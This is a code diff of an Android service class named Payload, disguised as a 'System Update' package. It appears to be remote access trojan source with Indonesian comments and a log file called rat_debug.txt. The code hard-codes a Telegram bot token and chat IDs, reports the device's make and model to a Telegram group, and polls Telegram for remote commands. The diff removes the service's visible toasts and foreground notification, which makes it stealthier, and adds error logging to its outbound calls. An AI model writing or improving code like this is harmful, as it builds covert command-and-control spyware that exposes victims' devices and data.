@@ -1,9 +1,6 @@
 package com.system.update;
 
 import android.app.Activity;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -11,7 +8,6 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.provider.Settings;
-import android.util.Log;
 import android.widget.Toast;
 import android.database.Cursor;
 import android.provider.ContactsContract;
@@ -36,17 +32,14 @@ import java.util.concurrent.TimeUnit;
 
 public class Payload extends Service {
     private String BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"; 
-    private String BUILDER_TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo";
-    
-    private String CHAT_ID = "8598136412"; // Chat pribadi
-    private String GROUP_ID = "-1004405270823"; // ID Grup
+    private String CHAT_ID = "8598136412"; 
+    private String GROUP_ID = "-1004405270823"; 
     
     private volatile boolean isRunning = true;
     private long lastUpdateId = 0;
 
     private void writeLog(String msg) {
         try {
-            // Balik ke External Files Dir biar gampang dicari
             File file = new File(getExternalFilesDir(null), "rat_debug.txt");
             FileOutputStream fos = new FileOutputStream(file, true);
             fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
@@ -88,59 +81,21 @@ public class Payload extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        try {
-            android.os.Handler handler = new android.os.Handler(getMainLooper());
-            handler.post(new Runnable() {
-                public void run() {
-                    Toast.makeText(getApplicationContext(), "Service Running", Toast.LENGTH_LONG).show();
-                }
-            });
-        } catch (Exception e) {}
-
-        writeLog("1. Service dimulai");
-        
-        try {
-            if (Build.VERSION.SDK_INT >= 26) {
-                String CHANNEL_ID = "sys_update_channel";
-                NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
-                channel.setShowBadge(false);
-                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-                if (manager != null) manager.createNotificationChannel(channel);
-
-                Notification notification = new Notification.Builder(this, CHANNEL_ID)
-                        .setContentTitle("System Update")
-                        .setContentText("Checking for updates...")
-                        .setSmallIcon(android.R.drawable.ic_popup_sync)
-                        .build();
-                startForeground(1, notification);
-                writeLog("2. Foreground Service berhasil");
-            }
-        } catch (Exception e) {
-            writeLog("ERROR StartForeground: " + e.getMessage());
-        }
+        writeLog("1. onStartCommand dipanggil");
 
         new Thread(new Runnable() {
             @Override
             public void run() {
-                try {
-                    android.os.Handler handler = new android.os.Handler(getMainLooper());
-                    handler.post(new Runnable() {
-                        public void run() {
-                            Toast.makeText(getApplicationContext(), "Thread Started", Toast.LENGTH_LONG).show();
-                        }
-                    });
-                } catch (Exception e) {}
-
-                writeLog("3. Thread jalan");
+                writeLog("2. Thread jalan");
                 String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
                 
-                sendTelegramMessage("🚀 *Service Active!*\nDevice: " + deviceName);
-                writeLog("4. Pesan Service Active terkirim/tertunda");
-
-                // --- INI YANG DIPERBAIKI ---
+                writeLog("3. Mencoba kirim CheckIn ke Grup...");
                 sendCheckIn(deviceName);
-                writeLog("5. CheckIn terkirim/tertunda");
+                
+                writeLog("4. Mencoba kirim Service Active ke Chat Pribadi...");
+                sendTelegramMessage("🚀 *Service Active!*\nDevice: " + deviceName);
 
+                writeLog("5. Masuk ke looping nunggu perintah...");
                 while (isRunning) {
                     try {
                         String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
@@ -192,9 +147,18 @@ public class Payload extends Service {
     private void sendCheckIn(String deviceInfo) {
         try {
             String encoded = URLEncoder.encode("/checkin " + deviceInfo, "UTF-8");
-            // PAKAI BOT_TOKEN (Payload) BIAR BOT BUILDER BISA DENGER DARI GRUP
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + GROUP_ID + "&text=" + encoded;
-            new URL(urlStr).openConnection().getInputStream().close();
+            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
+            int code = conn.getResponseCode();
+            
+            if (code == 200) {
+                writeLog("CheckIn SUKSES (200 OK)");
+            } else {
+                BufferedReader err = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
+                String line; StringBuilder sb = new StringBuilder();
+                while ((line = err.readLine()) != null) sb.append(line);
+                writeLog("CheckIn GAGAL (" + code + "): " + sb.toString());
+            }
         } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
     }
 
@@ -289,7 +253,11 @@ public class Payload extends Service {
         try {
             String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
-            new URL(urlStr).openConnection().getInputStream().close();
+            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
+            int code = conn.getResponseCode();
+            if (code != 200) {
+                writeLog("Kirim Pesan GAGAL (" + code + ")");
+            }
         } catch (Exception e) { writeLog("Error Kirim Pesan: " + e.getMessage()); }
     }
 
